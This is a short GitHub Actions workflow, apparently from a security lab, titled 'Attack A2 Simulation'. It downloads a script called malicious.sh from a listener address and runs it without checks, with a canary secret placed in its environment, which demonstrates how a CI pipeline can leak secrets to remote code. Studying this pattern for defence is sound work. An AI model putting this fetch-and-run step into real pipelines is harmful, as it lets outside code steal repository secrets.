name: Attack A2 Simulation
on: [workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Fetch hosted uploader script
        run: curl -sf -m 15 -o uploader.sh "${{ vars.LAB_LISTENER }}/vendor/malicious.sh"

      - name: Run uploader (no verification)
        env:
          LAB_CANARY: ${{ secrets.LAB_CANARY }}
          LAB_LISTENER: ${{ vars.LAB_LISTENER }}
        run: bash uploader.sh
